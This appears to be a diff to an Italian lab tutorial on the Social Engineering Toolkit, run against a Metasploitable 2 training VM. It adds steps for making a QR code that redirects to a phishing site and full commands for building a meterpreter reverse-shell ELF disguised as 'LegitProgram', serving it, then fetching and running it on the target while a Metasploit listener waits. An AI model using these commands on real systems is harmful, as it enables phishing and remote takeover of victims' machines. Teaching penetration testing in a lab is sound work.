@@ -39,19 +39,62 @@ Specificare URL del sito da clonare. Il sito deve avere una form di login
 
 Aprite Firefox e visitate il sito web digitando localhost nella barra degli indirizzi del browser e inserite un’ indirizzo email e una password fasulli
 
-## Creare un eseguibile malevolo per Windows
+## Creare un QRCode Malevolo 
 
-Dal menù principale del Social Engineering Toolkit selezionare opzione 4) Website Attack Vector
+Selezionare Opzione 8) QRCode Generator Attack Vector 
 
-Poi selezionare l'opzione Windows Shell Reverse TCP x64.
+![image](qrcode1.png)
 
-![image](payload.png)
+Specificare l'url del sito web di phishing a cui redirigere le potenziali vittime 
 
-Aprite un terminale e create un http server con il comando per trasferire il file sulla macchina della vittima.
+![image](qrcode2.png)
+
+Aprite qrcode_attack.png con un QRCode scanner online e.g Web QR per vedere che il QRCode punta al sito malevolo
+
+
+## Creare un eseguibile malevolo per Metasploitable 2
+
+Creiamo un esegeguibile malevolo usando msfvenom.
+
+```
+msfvenom -p linux/x86/meterpreter_reverse_tcp -a x86 -f elf --platform linux -o /tmp/LegitProgram LHOST = <IP Kali VM> LPORT=5678
+```
+Posizionarsi sotto la cartella /tmp
+
+```
+cd /tmp
+``` 
+Creare un http server con il seguente comando per trasferire il file sulla macchina della vittima.
 
 ```
 python3 -m http.server 8888
 ```
+
+Lanciare Metasploit e far partire un listener per la connessione di rete che verra' creata dal file malevolo:
+
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set LHOST <IP KAli VM>
+set LPORT 5678
+set ExitOnSession false
+exploit -j 
+```
+
+Sulla macchina Metasploitable 2 digitare il seguente comando per scaricare l'eseguibile malevolo
+
+```
+wget <IP Kali VM>:8888/LegitProgram
+```
+Poi digitare i seguenti comandi per dare i permessi di esecuzione ed eseguire il file malevolo
+
+```
+chmod +x LegitProgram.1
+./LegitProgram.1
+```
+<img width="468" height="636" alt="image" src="https://github.com/user-attachments/assets/7bc25eb5-62af-45ca-a984-1f3198b80e91" />
+
 
 ## Creare Chiavetta USB infetta 
 
